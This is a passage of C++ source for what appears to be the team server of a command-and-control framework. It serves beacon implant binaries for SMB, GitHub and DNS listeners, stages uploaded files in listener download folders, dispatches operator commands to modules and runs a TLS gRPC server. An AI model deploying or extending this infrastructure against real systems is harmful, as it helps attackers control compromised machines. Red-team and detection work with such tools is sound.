						beaconFilePath  = m_windowsBeaconsDirectoryPath;
						beaconFilePath += "BeaconSmb.exe";
					}
					else if(type == ListenerGithubType )
					{
						beaconFilePath  = m_windowsBeaconsDirectoryPath;
						beaconFilePath += "BeaconGithub.exe";
					}
					else if(type == ListenerDnsType )
					{
						beaconFilePath  = m_windowsBeaconsDirectoryPath;
						beaconFilePath += "BeaconDns.exe";
					}

					std::ifstream beaconFile(beaconFilePath, std::ios::binary );
					if (beaconFile.good()) 
					{
						std::string binaryData((std::istreambuf_iterator<char>(beaconFile)), std::istreambuf_iterator<char>());
						responseTmp.set_data(binaryData);
						responseTmp.set_result("ok");
					}
					else
					{
						responseTmp.set_result("Error: Beacons not found.");
						*response = responseTmp;
						return grpc::Status::OK;
					}
				}
			}

			if(responseTmp.result().empty())
			{
				responseTmp.set_result("Error: Listener not found.");
				*response = responseTmp;
				return grpc::Status::OK;
			}
		}
		else
		{
			responseTmp.set_result("Error: getBeaconBinary take one arguement.");
			*response = responseTmp;
			return grpc::Status::OK;
		}
	}
	else if(instruction=="putIntoUploadDir")
	{
		m_logger->info("putIntoUploadDir {0}", cmd);

		if(splitedCmd.size()==3)
		{
			std::string listenerHash = splitedCmd[1];

			std::string filename = splitedCmd[2];
			if (filename.find_first_not_of("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890-_.") != std::string::npos)
			{
				responseTmp.set_result("Error: filename not allowed.");
				*response = responseTmp;
				return grpc::Status::OK;
			}
			std::string data = command->data();

			std::string downloadFolder="";
			for (int i = 0; i < m_listeners.size(); i++)
			{
				std::string hash = m_listeners[i]->getListenerHash();
				if (hash.find(listenerHash) != std::string::npos) 
				{
					std::string type = m_listeners[i]->getType();

					try 
					{
						if (type == ListenerHttpType)
						{
							json configHttp = m_config["ListenerHttpConfig"];

							auto it = configHttp[0].find("downloadFolder");
							if(it != configHttp[0].end())
								downloadFolder = configHttp[0]["downloadFolder"].get<std::string>();;
											
						}
						else if (type == ListenerHttpsType)
						{
							json configHttps = m_config["ListenerHttpsConfig"];

							auto it = configHttps[0].find("downloadFolder");
							if(it != configHttps[0].end())
								downloadFolder = configHttps[0]["downloadFolder"].get<std::string>();;
						}
					}
					catch(...) 
					{
						responseTmp.set_result("Error: Value not found in config file.");
					} 
				}
			}

			if(!downloadFolder.empty())
			{
				std::string filePath = downloadFolder;
				filePath+="/";
				filePath+=filename;

				ofstream outputFile(filePath, ios::out | ios::binary);
				if (outputFile.good()) 
				{
					outputFile << data;
					outputFile.close();
					responseTmp.set_result("ok");
				}
				else
				{
					responseTmp.set_result("Error: Cannot write file.");
				}
			}
			else
			{
				responseTmp.set_result("Error: Listener don't have a download folder.");
			}
		}
		else
		{
			responseTmp.set_result("Error: putIntoUploadDir take tow arguements.");
			*response = responseTmp;
			return grpc::Status::OK;
		}
	}
	// TODO
	else if(instruction=="reloadModules")
	{
		// reload all the modules of the ../Modules directory
	}
	else
	{
		responseTmp.set_result("Error: not implemented.");
		*response = responseTmp;
		return grpc::Status::OK;
	}

	*response = responseTmp;

	return grpc::Status::OK;
}


int TeamServer::prepMsg(std::string& input, C2Message& c2Message)
{
	m_logger->trace("prepMsg");

	std::vector<std::string> splitedCmd;
	splitInputCmd(input, splitedCmd);

	if(splitedCmd.empty())
		return 0;

	int res=0;
	string instruction = splitedCmd[0];
	bool isModuleFound=false;
	for(int i=0; i<m_commonCommands.getNumberOfCommand(); i++)
	{
		if(instruction == m_commonCommands.getCommand(i))
		{
			res = m_commonCommands.init(splitedCmd, c2Message);
			isModuleFound=true;
		}
	}

	for (auto it = m_moduleCmd.begin(); it != m_moduleCmd.end(); ++it)
	{
		if (instruction == (*it)->getName())
		{
			res = (*it)->init(splitedCmd, c2Message);
			isModuleFound=true;
		}
	}

	if(!isModuleFound)
	{
		m_logger->warn("Module {0} not found.", instruction);
	}

	m_logger->trace("prepMsg end");

	return res;
}




int main(int argc, char* argv[])
{
	//
    // Logger
	//
	std::vector<spdlog::sink_ptr> sinks;

	auto console_sink = std::make_shared<spdlog::sinks::stdout_color_sink_mt>();
	console_sink->set_level(spdlog::level::info);
    sinks.push_back(console_sink);

	auto file_sink = std::make_shared<spdlog::sinks::rotating_file_sink_mt>("logs/TeamServer.txt", 1024*1024*10, 3);
	file_sink->set_level(spdlog::level::trace);
	sinks.push_back(file_sink);

   	std::unique_ptr logger = std::make_unique<spdlog::logger>("TeamServer", begin(sinks), end(sinks));
	logger->set_level(spdlog::level::trace);

	//
	// TeamServer Config
	//
	std::ifstream f("TeamServerConfig.json");
	json config = json::parse(f);
	
	std::string serverGRPCAdd = config["ServerGRPCAdd"].get<std::string>();
	std::string ServerGRPCPort = config["ServerGRPCPort"].get<std::string>();
	std::string serverAddress = serverGRPCAdd;
	serverAddress += ':';
	serverAddress += ServerGRPCPort;

	TeamServer service(config);

	// TSL Connection configuration
	std::string servCrtFilePath = config["ServCrtFile"].get<std::string>();
	std::ifstream servCrtFile(servCrtFilePath, std::ios::binary);
	if(!servCrtFile.good())
	{
		logger->critical("Server ceritifcat file not found.");
		return -1;
	}
	std::string cert(std::istreambuf_iterator<char>(servCrtFile), {});

	std::string servKeyFilePath = config["ServKeyFile"].get<std::string>();
	std::ifstream servKeyFile(servKeyFilePath, std::ios::binary);
	if(!servKeyFile.good())
	{
		logger->critical("Server key file not found.");
		return -1;
	}
	std::string key(std::istreambuf_iterator<char>(servKeyFile), {});

	std::string rootCA = config["RootCA"].get<std::string>();
	std::ifstream rootFile(rootCA, std::ios::binary);
	if(!rootFile.good())
	{
		logger->critical("Root CA file not found.");
		return -1;
	}
	std::string root(std::istreambuf_iterator<char>(rootFile), {});
	
    grpc::SslServerCredentialsOptions::PemKeyCertPair keycert =
    {
        key,
        cert
    };

    grpc::SslServerCredentialsOptions sslOps;
    sslOps.pem_root_certs = root;
    sslOps.pem_key_cert_pairs.push_back ( keycert );

	// Start GRPC Server
	grpc::ServerBuilder builder;
	builder.AddListeningPort(serverAddress, grpc::SslServerCredentials(sslOps));
	builder.RegisterService(&service);
	std::unique_ptr<grpc::Server> server(builder.BuildAndStart());

	logger->info("Team Server listening on {0}", serverAddress);

	server->Wait();
}

